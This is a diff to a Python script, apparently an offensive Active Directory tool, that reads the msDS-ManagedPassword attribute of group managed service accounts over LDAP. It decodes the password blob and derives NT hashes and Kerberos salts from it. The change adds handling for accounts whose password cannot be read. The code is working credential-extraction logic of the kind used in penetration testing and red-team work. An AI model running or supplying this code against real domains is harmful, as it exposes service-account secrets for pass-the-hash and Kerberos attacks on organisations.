@@ -84,13 +84,21 @@ if __name__ == "__main__":
 
     fqdn = args.connection.split('/')[0].upper()
 
-    for entry in conn.entries:
-        data = entry['msDS-ManagedPassword'].raw_values[0]
+    for entry in conn.response:
+        if 'raw_dn' not in entry:
+            continue
+
+        user = entry['raw_attributes']['sAMAccountName'][0].decode()
+
+        if not entry['raw_attributes']['msDS-ManagedPassword']:
+            print(f'[-] can\'t read the password of {user}')
+            continue
+
+        data = entry['raw_attributes']['msDS-ManagedPassword'][0]
         blob = MSDS_MANAGEDPASSWORD_BLOB()
         blob.fromString(data)
 
         passwd = blob['CurrentPassword'][:-2]
-        user = entry['sAMAccountName'].raw_values[0].decode()
 
         nthash = binascii.hexlify(hashlib.new("md4", passwd).digest()).decode()
         salt = f'{fqdn}host{user.replace("$", "").lower()}.{fqdn.lower()}'.encode('utf-8')
